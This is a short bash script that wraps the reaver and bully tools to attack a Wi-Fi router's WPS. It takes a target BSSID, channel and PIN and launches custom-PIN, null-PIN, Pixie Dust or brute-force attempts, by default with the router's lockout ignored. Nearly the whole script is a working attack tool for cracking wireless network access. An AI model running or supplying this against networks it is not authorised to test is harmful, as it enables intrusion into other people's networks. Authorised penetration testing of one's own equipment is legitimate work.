#!/bin/bash

INTERFACE=""
OPTION=""
TOOL=""
BSSID=""
CHANNEL=""
PIN=""
IGNORE_LOCKS="1"

while getopts "i:o:t:b:c:p:l" opt; do
  case "$opt" in
    i)  INTERFACE=$OPTARG;;
    o)  OPTION=$OPTARG;;
    t)  TOOL=$OPTARG;;
    b)  BSSID=$OPTARG;;
    c)  CHANNEL=$OPTARG;;
    p)  PIN=$OPTARG;;
    l)  IGNORE_LOCKS="";;
    esac
done


wps_force(){
    # REQUREMENTS: INTERFACE, ESSID and AUTH
    if [ $TOOL = "reaver" ]; then
        CMD="reaver -i $INTERFACE -b $BSSID -c $CHANNEL"

        case $OPTION in
            "custompin")
                CMD="$CMD -f -N -g 1 -d 2 -vv -p '$PIN'"
                if [ "$IGNORE_LOCKS" ]; then CMD="$CMD -L"; fi
                ;;
            "nullpin")
                CMD="$CMD -f -N -g 1 -d 2 -vv -p ''"
                if [ "$IGNORE_LOCKS" ]; then CMD="$CMD -L"; fi
                ;;
            "pixiedust")
                CMD="$CMD -K 1 -Z -N -vv"
                ;;
            "bruteforce")
                CMD="$CMD -f -N -vv"
                if [ "$IGNORE_LOCKS" ]; then CMD="$CMD -L -d 2"; fi
                ;;
        esac

    elif [ $TOOL = "bully" ]; then
        CMD="bully $INTERFACE -b $BSSID -c $CHANNEL"
        case $OPTION in
            "custompin")
                CMD="$CMD -F -B -v 3 -p '$PIN'"
                if [ "$IGNORE_LOCKS" ]; then CMD="$CMD -L"; fi
                ;;
            "pixiedust")
                CMD="$CMD -d -v 3"
                ;;
            "bruteforce_wps")
                CMD="$CMD -S -F -B -v 3"
                if [ "$IGNORE_LOCKS" ]; then CMD="$CMD -L"; fi
                ;;
        esac
    fi

    
    echo "Going to execute: echo \"n\" | $CMD"
    echo "n" | $CMD
}


wps_force